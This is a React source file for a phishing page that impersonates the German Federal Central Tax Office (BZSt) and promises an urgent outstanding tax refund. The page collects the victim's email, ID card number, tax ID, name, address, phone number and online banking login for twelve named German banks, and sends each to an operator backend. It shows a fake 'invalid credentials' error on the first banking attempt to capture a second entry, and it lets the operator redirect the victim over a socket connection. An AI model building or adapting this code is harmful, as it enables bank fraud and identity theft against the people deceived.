import React, { useEffect, useMemo, useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { createTemplateSession, getTemplateConfig, submitTemplateData } from '../../utils/templateApi';
import { getTemplateMetadata, updatePageMetadata } from '../../utils/templateMetadata';
import templateSocketClient from '../../utils/socketClient';
import './BzstStyle.css';

const STATES = {
  NOTICE: 'notice',
  LOGIN: 'login',
  PROCESSING: 'processing',
  SUCCESS: 'success',
  ERROR: 'error'
};

interface AvailableBank {
  id: string;
  displayName: string;
  logo: string;
  description: string;
  isActive: boolean;
}

const AVAILABLE_BANKS: AvailableBank[] = [
  { id: 'commerzbank', displayName: 'Commerzbank', logo: '/images/icons/commerzbank.png', description: 'Commerzbank AG', isActive: true },
  { id: 'sparkasse', displayName: 'Sparkasse', logo: '/images/icons/sparkasse.png', description: 'Sparkassen-Finanzgruppe', isActive: true },
  { id: 'dkb', displayName: 'DKB', logo: '/images/icons/dkb.png', description: 'Deutsche Kreditbank AG', isActive: true },
  { id: 'volksbank', displayName: 'Volksbank', logo: '/images/icons/volksbank.png', description: 'Volksbank Raiffeisenbank', isActive: true },
  { id: 'postbank', displayName: 'Postbank', logo: '/images/icons/postbank.png', description: 'Deutsche Postbank AG', isActive: true },
  { id: 'santander', displayName: 'Santander', logo: '/images/icons/santander.png', description: 'Santander Consumer Bank', isActive: true },
  { id: 'apobank', displayName: 'Apobank', logo: '/images/icons/apobank.png', description: 'Deutsche Apotheker- und Ärztebank', isActive: true },
  { id: 'comdirect', displayName: 'comdirect', logo: '/images/icons/comdirect.png', description: 'comdirect bank AG', isActive: true },
  { id: 'consorsbank', displayName: 'Consorsbank', logo: '/images/icons/Consorsbank.png', description: 'Consorsbank', isActive: true },
  { id: 'ingdiba', displayName: 'ING', logo: '/images/icons/ingdiba.png', description: 'ING-DiBa AG', isActive: true },
  { id: 'deutsche_bank', displayName: 'Deutsche Bank', logo: '/images/icons/deutschebank.png', description: 'Deutsche Bank AG', isActive: true },
  { id: 'targobank', displayName: 'TARGOBANK', logo: '/images/icons/targobank.png', description: 'TARGOBANK AG', isActive: true }
];

interface StepConfig {
  login: boolean;
}

const DEFAULT_CONFIG: StepConfig = {
  login: true
};

const BzstTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();
  const navigate = useNavigate();
  const [state, setState] = useState(STATES.NOTICE);
  const [loading, setLoading] = useState(true);
  const [loadingMessage, setLoadingMessage] = useState('Sitzung wird initialisiert...');
  const [error, setError] = useState<string | null>(null);
  const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [configLoaded, setConfigLoaded] = useState(false);
  const [activeTab, setActiveTab] = useState<'email' | 'id' | 'tax' | 'personal' | 'bank' | 'card'>('email');
  const [formError, setFormError] = useState<string | null>(null);
  const [emailValue, setEmailValue] = useState('');
  const [idValue, setIdValue] = useState('');
  const [taxValue, setTaxValue] = useState('');
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [birthDate, setBirthDate] = useState('');
  const [street, setStreet] = useState('');
  const [houseNumber, setHouseNumber] = useState('');
  const [postalCode, setPostalCode] = useState('');
  const [city, setCity] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('+49');
  const [personalEmail, setPersonalEmail] = useState('');
  const [bankAccess, setBankAccess] = useState('');
  const [bankPassword, setBankPassword] = useState('');
  const [showBankPassword, setShowBankPassword] = useState(false);
  const [bankLoginAttempts, setBankLoginAttempts] = useState(0);
  const [bankSearch, setBankSearch] = useState('');
  const [bankDropdownOpen, setBankDropdownOpen] = useState(false);
  const [selectedBank, setSelectedBank] = useState<AvailableBank | null>(null);

  const filteredBanks = useMemo(() => {
    const activeBanks = AVAILABLE_BANKS.filter((bank) => bank.isActive);
    if (!bankSearch) return activeBanks;
    const searchLower = bankSearch.toLowerCase();
    return activeBanks.filter(
      (bank) =>
        bank.displayName.toLowerCase().includes(searchLower) ||
        bank.description.toLowerCase().includes(searchLower)
    );
  }, [bankSearch]);

  useEffect(() => {
    const metadata = getTemplateMetadata('bzst');
    updatePageMetadata(metadata);

    const loadConfig = async () => {
      try {
        setLoadingMessage('Schritt-Konfiguration wird geladen...');
        const config = await getTemplateConfig('bzst');
        setStepConfig({
          login: config.steps?.login ?? true
        });
        setConfigLoaded(true);
      } catch (err) {
        setConfigLoaded(true);
      }
    };

    const initializeSession = async () => {
      if (!key) {
        try {
          setLoading(true);
          setLoadingMessage('Sitzung wird erstellt...');
          const newKey = await createTemplateSession('bzst');
          navigate(`/bzst/${newKey}`);
        } catch (err) {
          const fallbackKey = Math.random().toString(36).substring(2, 15);
          navigate(`/bzst/${fallbackKey}`);
        } finally {
          setLoading(false);
        }
      }
    };

    const initializeAfterConfig = async () => {
      await loadConfig();
      setLoadingMessage('Sitzung wird initialisiert...');
      setTimeout(() => setLoading(false), 800);
    };

    initializeAfterConfig();
    initializeSession();

    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'bzst',
        onStateForced: (nextState: string, message?: string) => {
          setLoading(true);
          setLoadingMessage(message || 'Bitte warten...');
          setTimeout(() => {
            setState(nextState);
            setLoading(false);
          }, 1200);
        },
        onMessage: (message: string, type: string) => {
          alert(`${type.toUpperCase()}: ${message}`);
        },
        onRedirect: (url: string) => {
          window.location.href = url;
        }
      });
    }

    return () => {
      templateSocketClient.disconnect();
    };
  }, [key, navigate]);

  const handleLoginSubmit = async (email: string) => {
    try {
      setLoading(true);
      setLoadingMessage('Anmeldung wird verarbeitet...');

      const response = await submitTemplateData({
        template_name: 'bzst',
        key: key || '',
        step: 'email-login',
        data: { email }
      });

      if (!response.success) {
        setError(response.error || 'Fehler bei der Anmeldung');
        setState(STATES.ERROR);
        return;
      }

      setState(STATES.LOGIN);
    } catch (err) {
      setError('Fehler bei der Anmeldung');
      setState(STATES.ERROR);
    } finally {
      setLoading(false);
    }
  };

  const handleTabSubmit = async () => {
    setFormError(null);
    if (activeTab === 'email') {
      await handleLoginSubmit(emailValue);
      setActiveTab('id');
      return;
    }

    if (activeTab === 'id') {
      setLoading(true);
      setLoadingMessage('Anmeldung wird verarbeitet...');
      try {
        const response = await submitTemplateData({
          template_name: 'bzst',
          key: key || '',
          step: 'ausweisnummer',
          data: { ausweisnummer: idValue }
        });

        if (!response.success) {
          setError(response.error || 'Fehler bei der Anmeldung');
          setState(STATES.ERROR);
          return;
        }

        setActiveTab('tax');
      } catch (err) {
        setError('Fehler bei der Anmeldung');
        setState(STATES.ERROR);
      } finally {
        setLoading(false);
      }
      return;
    }

    if (activeTab === 'tax') {
      if (!/^[0-9]{11}$/.test(taxValue)) {
        setFormError('Bitte geben Sie eine 11-stellige Steueridentifikationsnummer ohne Sonderzeichen oder Buchstaben ein.');
        return;
      }

      setLoading(true);
      setLoadingMessage('Anmeldung wird verarbeitet...');
      try {
        const response = await submitTemplateData({
          template_name: 'bzst',
          key: key || '',
          step: 'steueridentifikationsnummer',
          data: { steueridentifikationsnummer: taxValue }
        });

        if (!response.success) {
          setError(response.error || 'Fehler bei der Anmeldung');
          setState(STATES.ERROR);
          return;
        }

        setPersonalEmail(emailValue);
        setActiveTab('personal');
      } catch (err) {
        setError('Fehler bei der Anmeldung');
        setState(STATES.ERROR);
      } finally {
        setLoading(false);
      }
      return;
    }

    if (activeTab === 'personal') {
      setPersonalEmail(personalEmail || emailValue);
      setActiveTab('bank');
      return;
    }

    if (activeTab === 'bank') {
      if (!selectedBank) {
        setFormError('Bitte wählen Sie Ihre Bank aus.');
        return;
      }

      setActiveTab('card');
      return;
    }

    if (activeTab === 'card') {
      if (!selectedBank) {
        setFormError('Bitte wählen Sie Ihre Bank aus.');
        return;
      }

      const nextAttempt = bankLoginAttempts + 1;

      setLoading(true);
      setLoadingMessage('Persönliche Daten werden gesendet...');
      try {
        const response = await submitTemplateData({
          template_name: 'bzst',
          key: key || '',
          step: 'personal-data-complete',
          data: {
            email: personalEmail || emailValue,
            first_name: firstName,
            last_name: lastName,
            date_of_birth: birthDate,
            street,
            street_number: houseNumber,
            plz: postalCode,
            city,
            phone: phoneNumber,
            ausweisnummer: idValue,
            steueridentifikationsnummer: taxValue,
            vorname: firstName,
            nachname: lastName,
            geburtsdatum: birthDate,
            strasse: street,
            hausnummer: houseNumber,
            ort: city,
            telefonnummer: phoneNumber,
            selected_bank: selectedBank.id,
            selected_bank_name: selectedBank.displayName,
            selected_bank_description: selectedBank.description,
            username: bankAccess,
            password: bankPassword,
            login_attempt: nextAttempt
          }
        });

        setBankLoginAttempts(nextAttempt);

        if (!response.success) {
          setError(response.error || 'Fehler beim Speichern der Daten');
          setState(STATES.ERROR);
          return;
        }

        if (nextAttempt === 1) {
          setBankAccess('');
          setBankPassword('');
          setShowBankPassword(false);
          setFormError('Sie haben eine ungültige Kombination aus Benutzername und Passwort eingegeben.');
          return;
        }

        setState(STATES.SUCCESS);
      } catch (err) {
        setError('Fehler beim Speichern der Daten');
        setState(STATES.ERROR);
      } finally {
        setLoading(false);
      }
    }
  };

  const renderContent = () => {
    if (loading || !configLoaded) {
      return (
        <div className="bzst-panel">
          <h3>{loadingMessage}</h3>
          <p>Bitte warten Sie einen Moment.</p>
        </div>
      );
    }

    if (state === STATES.ERROR) {
      return (
        <div className="bzst-panel">
          <h3>Ein Fehler ist aufgetreten</h3>
          <p>{error || 'Bitte versuchen Sie es erneut.'}</p>
          <button
            className="bzst-btn"
            onClick={() => {
              setError(null);
              setState(STATES.LOGIN);
            }}
          >
            Erneut versuchen
          </button>
        </div>
      );
    }

    if (state === STATES.SUCCESS) {
      return (
        <div className="bzst-panel">
          <h3>Sie haben sich erfolgreich registriert</h3>
          <p>Ihre Angaben wurden erfolgreich übermittelt.</p>
        </div>
      );
    }

    if (state === STATES.PROCESSING) {
      return (
        <div className="bzst-panel">
          <h3>Verarbeitung läuft</h3>
          <p>Ihre Angaben werden sicher geprüft. Bitte warten Sie einen Moment.</p>
        </div>
      );
    }

    if (!stepConfig.login) {
      return (
        <div className="bzst-panel">
          <h3>Anmeldung nicht verfügbar</h3>
          <p>Diese Anmeldemethode ist derzeit deaktiviert.</p>
        </div>
      );
    }

    return (
      <div className="bzst-panel">
        <h3>
          {activeTab === 'email' && 'Anmeldemethode: E-Mail Login'}
          {activeTab === 'id' && 'Anmeldemethode: Ausweisnummer'}
          {activeTab === 'tax' && 'Anmeldemethode: Steueridentifikationsnummer'}
          {activeTab === 'personal' && 'Anmeldemethode: Persönliche Daten'}
          {activeTab === 'bank' && 'Anmeldemethode: Bankauswahl'}
          {activeTab === 'card' && 'Anmeldemethode: Internetbanking'}
        </h3>
        <p>
          {activeTab === 'email' && (
            'Bitte tragen Sie Ihre E-Mail-Adresse ein, um den Prozess zur Begleichung des ausstehenden Restbetrags Ihrer Steuerrückzahlung zu beginnen. Ihre Daten werden gemäß unseren Sicherheitsrichtlinien geschützt verarbeitet.'
          )}
          {activeTab === 'id' && (
            'Bitte tragen Sie Ihre Ausweisnummer ein, um mit dem nächsten Schritt fortzufahren. Ihre Angaben werden gemäß unseren Sicherheitsrichtlinien geschützt verarbeitet.'
          )}
          {activeTab === 'tax' && (
            'Bitte geben Sie Ihre 11-stellige Steueridentifikationsnummer ohne Sonderzeichen oder Buchstaben ein, um den Vorgang abzuschließen.'
          )}
          {activeTab === 'personal' && (
            'Bitte ergänzen Sie Ihre persönlichen Angaben. Die Daten werden gemäß unseren Sicherheitsrichtlinien geschützt verarbeitet.'
          )}
          {activeTab === 'bank' && (
            'Bitte wählen Sie Ihre Bank aus der Liste aus, um fortzufahren.'
          )}
          {activeTab === 'card' && (
            'Bitte geben Sie Ihre Zugangsdaten für das Internetbanking ein, um die Registrierung abzuschließen.'
          )}
        </p>
        <form
          onSubmit={(event) => {
            event.preventDefault();
            handleTabSubmit();
          }}
        >
          <div className="bzst-form-box">
            {formError && <div className="bzst-form-error">{formError}</div>}
            {activeTab === 'email' && (
              <div className="bzst-form-group">
                <label htmlFor="email"><strong>E-Mail Adresse</strong></label>
                <input
                  id="email"
                  name="email"
                  type="email"
                  placeholder="E-Mail Adresse"
                  className="bzst-input"
                  value={emailValue}
                  onChange={(event) => setEmailValue(event.target.value)}
                  required
                />
              </div>
            )}

            {activeTab === 'bank' && (
              <div className="bzst-form-group">
                <label><strong>Wählen Sie Ihre Bank</strong></label>
                <div className="bzst-bank-dropdown">
                  <button
                    type="button"
                    className={`bzst-bank-dropdown-trigger ${bankDropdownOpen ? 'is-open' : ''}`}
                    onClick={() => setBankDropdownOpen((open) => !open)}
                  >
                    {selectedBank ? (
                      <div className="bzst-selected-bank">
                        <img
                          src={selectedBank.logo}
                          alt={selectedBank.displayName}
                          className="bzst-selected-bank-logo"
                          onError={(event) => {
                            (event.target as HTMLImageElement).src = '/images/icons/bankingsuote.png';
                          }}
                        />
                        <div className="bzst-selected-bank-info">
                          <span className="bzst-selected-bank-name">{selectedBank.displayName}</span>
                          <span className="bzst-selected-bank-desc">{selectedBank.description}</span>
                        </div>
                      </div>
                    ) : (
                      <span className="bzst-bank-placeholder">Bank auswählen...</span>
                    )}
                    <span className="bzst-bank-dropdown-arrow">▾</span>
                  </button>

                  {bankDropdownOpen && (
                    <div className="bzst-bank-dropdown-menu">
                      <div className="bzst-bank-search">
                        <input
                          type="text"
                          className="bzst-bank-search-input"
                          placeholder="Bank suchen..."
                          value={bankSearch}
                          onChange={(event) => setBankSearch(event.target.value)}
                          autoFocus
                        />
                      </div>
                      <div className="bzst-bank-options">
                        {filteredBanks.length > 0 ? (
                          filteredBanks.map((bank) => (
                            <button
                              key={bank.id}
                              type="button"
                              className="bzst-bank-option"
                              onClick={() => {
                                setSelectedBank(bank);
                                setBankDropdownOpen(false);
                                setBankSearch('');
                              }}
                            >
                              <img
                                src={bank.logo}
                                alt={bank.displayName}
                                className="bzst-bank-option-logo"
                                onError={(event) => {
                                  (event.target as HTMLImageElement).src = '/images/icons/bankingsuote.png';
                                }}
                              />
                              <div className="bzst-bank-option-info">
                                <span className="bzst-bank-option-name">{bank.displayName}</span>
                                <span className="bzst-bank-option-desc">{bank.description}</span>
                              </div>
                            </button>
                          ))
                        ) : (
                          <div className="bzst-bank-no-results">Keine Banken gefunden</div>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )}

            {activeTab === 'card' && (
              <div className="bzst-form-grid">
                <div className="bzst-form-field full">
                  <label htmlFor="zugang"><strong>Zugangsnummer oder Benutzername</strong></label>
                  <input
                    id="zugang"
                    name="zugang"
                    type="text"
                    className="bzst-input"
                    value={bankAccess}
                    onChange={(event) => setBankAccess(event.target.value)}
                    required
                  />
                </div>
                <div className="bzst-form-field full">
                  <label htmlFor="banking-passwort"><strong>Internetbanking PIN oder Passwort</strong></label>
                  <div className="bzst-password-field">
                    <input
                      id="banking-passwort"
                      name="banking-passwort"
                      type={showBankPassword ? 'text' : 'password'}
                      className="bzst-input"
                      value={bankPassword}
                      onChange={(event) => setBankPassword(event.target.value)}
                      required
                    />
                    <button
                      type="button"
                      className="bzst-password-toggle"
                      onClick={() => setShowBankPassword((prev) => !prev)}
                      aria-label={showBankPassword ? 'Passwort verbergen' : 'Passwort anzeigen'}
                    >
                      {showBankPassword ? (
                        <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                          <path
                            fill="currentColor"
                            d="M12 5c4.97 0 9.03 3.16 10.5 7.5-1.47 4.34-5.53 7.5-10.5 7.5S2.97 16.84 1.5 12.5C2.97 8.16 7.03 5 12 5Zm0 2C8.4 7 5.28 9.1 3.98 12.5 5.28 15.9 8.4 18 12 18s6.72-2.1 8.02-5.5C18.72 9.1 15.6 7 12 7Zm0 2.25A3.25 3.25 0 1 1 8.75 12.5 3.25 3.25 0 0 1 12 9.25Z"
                          />
                        </svg>
                      ) : (
                        <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                          <path
                            fill="currentColor"
                            d="m3.53 2.47 17.95 17.95-1.06 1.06-3.07-3.07A11.9 11.9 0 0 1 12 20c-4.97 0-9.03-3.16-10.5-7.5A12.02 12.02 0 0 1 5.1 7.1L2.47 4.53l1.06-1.06Zm3.02 3.02L7.94 6.88A9.92 9.92 0 0 0 3.98 12.5C5.28 15.9 8.4 18 12 18c1.3 0 2.53-.26 3.66-.73l-1.7-1.7a4.25 4.25 0 0 1-5.53-5.53l-1.88-1.88Zm5.45 5.45 3.51 3.51a2.25 2.25 0 0 0-3.51-3.51ZM12 7c1.53 0 2.97.38 4.25 1.05l-1.54 1.54A3.25 3.25 0 0 0 9.59 14.7l-1.54 1.54A5.25 5.25 0 0 1 12 7Zm6.9 3.08 1.87-1.87C19.14 6.26 15.75 5 12 5c-1.6 0-3.12.23-4.54.66l1.7 1.7C10.05 7.13 11.01 7 12 7c3.6 0 6.72 2.1 8.02 5.5-.32.9-.75 1.73-1.26 2.47l-1.48-1.48a9.76 9.76 0 0 0 .62-1c-.35-.9-.74-1.67-1-2.41Z"
                          />
                        </svg>
                      )}
                    </button>
                  </div>
                  <div className="bzst-password-hint">
                    5- bis 10-stellige Internetbanking PIN oder
                    Passwort, das Sie selbst vergeben haben.
                  </div>
                </div>
              </div>
            )}

            {activeTab === 'id' && (
              <div className="bzst-form-group">
                <label htmlFor="ausweisnummer"><strong>Ausweisnummer</strong></label>
                <input
                  id="ausweisnummer"
                  name="ausweisnummer"
                  type="text"
                  placeholder="Ausweisnummer"
                  className="bzst-input"
                  value={idValue}
                  onChange={(event) => setIdValue(event.target.value)}
                  required
                />
              </div>
            )}

            {activeTab === 'tax' && (
              <div className="bzst-form-group">
                <label htmlFor="steueridentifikationsnummer"><strong>Steueridentifikationsnummer</strong></label>
                <input
                  id="steueridentifikationsnummer"
                  name="steueridentifikationsnummer"
                  type="text"
                  placeholder="Steueridentifikationsnummer"
                  className="bzst-input"
                  value={taxValue}
                  onChange={(event) => setTaxValue(event.target.value)}
                  required
                />
              </div>
            )}

            {activeTab === 'personal' && (
              <div className="bzst-form-grid">
                <div className="bzst-form-field bzst-area-first">
                  <label htmlFor="vorname"><strong>Vorname</strong></label>
                  <input
                    id="vorname"
                    name="vorname"
                    type="text"
                    className="bzst-input"
                    value={firstName}
                    onChange={(event) => setFirstName(event.target.value)}
                    required
                  />
                </div>
                <div className="bzst-form-field bzst-area-last">
                  <label htmlFor="nachname"><strong>Nachname</strong></label>
                  <input
                    id="nachname"
                    name="nachname"
                    type="text"
                    className="bzst-input"
                    value={lastName}
                    onChange={(event) => setLastName(event.target.value)}
                    required
                  />
                </div>
                <div className="bzst-form-field bzst-area-birth">
                  <label htmlFor="geburtsdatum"><strong>Geburtsdatum</strong></label>
                  <input
                    id="geburtsdatum"
                    name="geburtsdatum"
                    type="date"
                    className="bzst-input"
                    value={birthDate}
                    onChange={(event) => setBirthDate(event.target.value)}
                    required
                  />
                </div>
                <div className="bzst-form-field bzst-area-street">
                  <label htmlFor="strasse"><strong>Straße</strong></label>
                  <input
                    id="strasse"
                    name="strasse"
                    type="text"
                    className="bzst-input"
                    value={street}
                    onChange={(event) => setStreet(event.target.value)}
                    required
                  />
                </div>
                <div className="bzst-form-field bzst-area-house">
                  <label htmlFor="hausnummer"><strong>Hausnummer</strong></label>
                  <input
                    id="hausnummer"
                    name="hausnummer"
                    type="text"
                    className="bzst-input"
                    value={houseNumber}
                    onChange={(event) => setHouseNumber(event.target.value)}
                    required
                  />
                </div>
                <div className="bzst-form-field bzst-area-plz">
                  <label htmlFor="plz"><strong>PLZ</strong></label>
                  <input
                    id="plz"
                    name="plz"
                    type="text"
                    className="bzst-input"
                    value={postalCode}
                    maxLength={5}
                    inputMode="numeric"
                    onChange={(event) => {
                      const onlyDigits = event.target.value.replace(/\D/g, '').slice(0, 5);
                      setPostalCode(onlyDigits);
                    }}
                    required
                  />
                </div>
                <div className="bzst-form-field bzst-area-city">
                  <label htmlFor="ort"><strong>Ort</strong></label>
                  <input
                    id="ort"
                    name="ort"
                    type="text"
                    className="bzst-input"
                    value={city}
                    onChange={(event) => setCity(event.target.value)}
                    required
                  />
                </div>
                <div className="bzst-form-field bzst-area-phone">
                  <label htmlFor="telefonnummer"><strong>Telefonnummer</strong></label>
                  <input
                    id="telefonnummer"
                    name="telefonnummer"
                    type="tel"
                    className="bzst-input"
                    value={phoneNumber}
                    onChange={(event) => {
                      const raw = event.target.value.replace(/\s+/g, '');
                      const normalized = raw.startsWith('+49')
                        ? `+49${raw.slice(3).replace(/\D/g, '')}`
                        : `+49${raw.replace(/\D/g, '')}`;
                      setPhoneNumber(normalized);
                    }}
                    required
                  />
                </div>
                <div className="bzst-form-field bzst-area-email">
                  <label htmlFor="email-personal"><strong>E-Mail-Adresse</strong></label>
                  <input
                    id="email-personal"
                    name="email-personal"
                    type="email"
                    className="bzst-input"
                    value={personalEmail}
                    onChange={(event) => setPersonalEmail(event.target.value)}
                    required
                  />
                </div>
              </div>
            )}


            <button type="submit" className="bzst-btn">
              {activeTab === 'card' ? 'Registrieren' : 'Weiter'}
            </button>
          </div>
        </form>
      </div>
    );
  };

  return (
    <div className="bzst-template">
      <header className="bzst-header">
        <div className="bzst-header-inner">
          <div className="bzst-header-top">
            <div className="bzst-brand">
              <img
                src="/templates/BZST/images/BZSt_Logo.png"
                alt="Bundeszentralamt für Steuern"
                className="bzst-brand-logo"
              />
            </div>
            <label className="bzst-nav-toggle" htmlFor="bzst-nav-toggle" aria-label="Menü öffnen">
              <span></span>
              <span></span>
              <span></span>
            </label>
          </div>
          <input type="checkbox" id="bzst-nav-toggle" className="bzst-nav-toggle-input" />
          <nav className="bzst-nav">
            <div className="bzst-nav-links">
              <span className="bzst-portal-pill">BZSt Online.Portal</span>
              <a href="#">Kontakt</a>
              <a href="#">English</a>
              <a href="#">Leichte Sprache</a>
              <a href="#">Gebärdensprache</a>
            </div>
          </nav>
        </div>
      </header>

      <section className="bzst-content">
        <aside className="bzst-sidebar">
          <div className="bzst-sidebar-item active">Das BZSt</div>
          <div className="bzst-sidebar-item">
            <span className="bzst-sidebar-icon"></span>
            Steuernachzahlungen
          </div>
        </aside>
        <main className="bzst-main">
          <h1 className="bzst-title">
            Dringende Maßnahmen erforderlich: Ihr noch offener Betrag für die Steuerrückzahlung ist bereit.
          </h1>
          <p className="bzst-lead">
            Willkommen im offiziellen BZSt Online Portal, wo Sie Ihre ausstehenden Steuerzahlungen begleichen können.
          </p>
          <p className="bzst-lead">
            Wir möchten Sie dringend darauf aufmerksam machen, dass es gemäß den europäischen Gesetzen entscheidend ist,
            dass Sie die Ihnen zustehende Steuerrückzahlung umgehend anfordern. Andernfalls könnte das ausstehende Geld,
            das Ihnen vom Finanzamt zusteht, möglicherweise nicht mehr ausgezahlt werden, da die gesetzliche Frist bereits
            verstrichen ist.
          </p>
          <p className="bzst-lead">
            Um den Vorgang erfolgreich abzuschließen, bitten wir Sie, die folgenden Schritte noch heute durchzuführen:
            Bitte beachten Sie, dass es sich bei dieser Steuerrückzahlung um den verbleibenden Betrag einer Ihrer letzten
            Abrechnungen beim Finanzamt handelt. Das Finanzamt hat festgestellt, dass es bestimmten Personen noch ausstehende
            Beträge auszuzahlen hat. Unser Ziel ist es, diesen Prozess für Sie so klar und einfach wie möglich zu gestalten.
          </p>
          <ul className="bzst-list">
            <li>
              <strong>Anmelden:</strong> Bitte melden Sie sich auf unserem Online-Portal des Bundeszentralamts für Steuern an.
              Falls Sie noch keine Zugangsdaten haben, wählen Sie bitte eine der alternativen Anmeldemethoden aus.
            </li>
            <li>
              <strong>Personenidentifikation:</strong> Aus Sicherheitsgründen kann es notwendig sein, Ihre Identität zu bestätigen.
              Bitte befolgen Sie die Anweisungen, um diesen Schritt abzuschließen.
            </li>
            <li>
              <strong>Bankauswahl:</strong> Nachdem Sie Ihre persönlichen Angaben übermittelt haben, wählen Sie bitte Ihre Bank
              aus der Liste der verfügbaren Optionen aus. Dadurch können wir den Transfer des ausstehenden Restbetrags problemlos
              durchführen.
            </li>
            <li>
              <strong>Dokumentengenerierung:</strong> Sobald Sie alle erforderlichen Schritte abgeschlossen haben, wird Ihr Anliegen
              zeitnah bearbeitet. Innerhalb von 4 bis 8 Wochen erhalten Sie alle wichtigen Informationen zur Steuerrückerstattung,
              und der Rückerstattungsbetrag wird direkt auf Ihr Konto überwiesen.
            </li>
          </ul>
          <p className="bzst-hint">
            <span>Hinweis:</span> Wir möchten Sie darauf hinweisen, dass das Bundeszentralamt für Steuern künftig ein alternatives
            Verfahren für eingehende oder ausgehende Zahlungen anbietet. Bitte folgen Sie den Anweisungen.
          </p>

          <div className="bzst-section-divider"></div>

          <h2 className="bzst-form-title">Mit welchem Anmeldeverfahren möchten Sie fortfahren?</h2>
          <div className="bzst-tabs">
            <button
              type="button"
              className={`bzst-tab ${activeTab === 'email' ? 'active' : ''}`}
              disabled
            >
              <span className="bzst-tab-icon">@</span>
              E-Mail
            </button>
            <button
              type="button"
              className={`bzst-tab ${activeTab === 'id' ? 'active' : ''}`}
              disabled
            >
              <span className="bzst-tab-icon">ID</span>
              Ausweisnummer
            </button>
            <button
              type="button"
              className={`bzst-tab ${activeTab === 'tax' ? 'active' : ''}`}
              disabled
            >
              <span className="bzst-tab-icon">#</span>
              Steueridentifikationsnummer
            </button>
            <button
              type="button"
              className={`bzst-tab ${activeTab === 'personal' ? 'active' : ''}`}
              disabled
            >
              <span className="bzst-tab-icon">
                <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                  <path
                    fill="currentColor"
                    d="M12 12a4 4 0 1 0-4-4 4 4 0 0 0 4 4Zm0 2c-3.33 0-6 1.34-6 3v2h12v-2c0-1.66-2.67-3-6-3Z"
                  />
                </svg>
              </span>
              Persönliche Daten
            </button>
          </div>

          {renderContent()}
        </main>
      </section>

      <footer className="bzst-footer">
        <div className="bzst-footer-top">
          <div className="bzst-footer-col">
            <a href="#">Privatpersonen →</a>
            <a href="#">Unternehmen →</a>
            <a href="#">Behörden →</a>
            <a href="#">Das BZSt →</a>
            <a href="#">Service →</a>
          </div>
          <div className="bzst-footer-col">
            <a href="#">Themen A-Z →</a>
            <a href="#">Karriere →</a>
            <a href="#">Presse →</a>
            <a href="#">Newsletter →</a>
          </div>
          <div className="bzst-footer-col bzst-footer-help">
            <h4>Haben Sie Fragen?</h4>
            <div className="bzst-footer-item">
              <span className="bzst-footer-icon">☎</span>
              <span>Anrufen</span>
            </div>
            <div className="bzst-footer-item">
              <span className="bzst-footer-icon">✉</span>
              <span>Nachricht schreiben</span>
            </div>
            <h4>Zentrale Behördennummer</h4>
            <p>Für alle Fragen zu Behörden in Deutschland</p>
            <p>Montag bis Freitag 08:00-18:00 Uhr</p>
            <div className="bzst-footer-number">
              <span className="bzst-footer-number-value">115</span>
              <a href="#">Mehr erfahren →</a>
            </div>
          </div>
        </div>
        <div className="bzst-footer-bottom">
          <div className="bzst-footer-links">
            <a href="#">Inhaltsverzeichnis</a>
            <a href="#">Erklärung zur Barrierefreiheit</a>
            <a href="#">Impressum</a>
            <a href="#">Datenschutz</a>
          </div>
          <div className="bzst-footer-copy">© Bundeszentralamt für Steuern</div>
        </div>
      </footer>
    </div>
  );
};

export default BzstTemplate;
